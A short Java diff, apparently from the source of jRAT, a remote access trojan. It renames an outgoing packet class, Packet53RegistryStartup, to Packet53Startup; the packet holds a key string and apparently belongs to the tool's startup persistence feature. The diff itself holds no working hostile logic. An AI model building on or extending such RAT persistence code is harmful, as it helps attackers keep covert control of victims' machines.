@@ -4,11 +4,11 @@ import jrat.client.Connection;
 import jrat.client.packets.outgoing.OutgoingPacket;
 
 
-public class Packet53RegistryStartup implements OutgoingPacket {
+public class Packet53Startup implements OutgoingPacket {
 
 	private String key;
 
-	public Packet53RegistryStartup(String key) {
+	public Packet53Startup(String key) {
 		this.key = key;
 	}
 
